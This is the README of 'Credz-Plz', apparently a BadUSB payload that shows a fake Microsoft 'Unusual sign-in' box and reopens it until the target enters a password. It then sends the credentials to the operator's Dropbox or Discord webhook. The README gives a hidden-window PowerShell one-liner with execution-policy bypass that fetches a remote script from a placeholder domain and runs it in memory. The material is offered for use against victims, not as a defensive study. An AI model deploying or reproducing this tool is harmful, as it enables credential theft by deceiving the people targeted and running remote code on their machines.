##

<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# Credz-Plz

A script used to prompt the target to enter their creds to later be exfiltrated with either Dropbox or a Discord webhook.

## Description

A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account".
This will be followed by a fake authentication ui prompt. 
If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up.
Once the target enters their credentials their information will be uploaded to your Dropbox or Discord webhook for collection.

## Getting Started

### Dependencies

* DropBox or other file sharing service - Your Shared link for the intended file
* Windows 10,11

##

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* You no longer need to host your own version of this script 
* `$db` is the variable that holds your DropBox token
* `$dc` is the variable that holds your Discord webhook 
* Fill in either variable or both to set your exfil method

```
powershell -w h -ep bypass $dc='';$db='';irm https://MYDOMAIN.HERE/35k | iex
```

##

#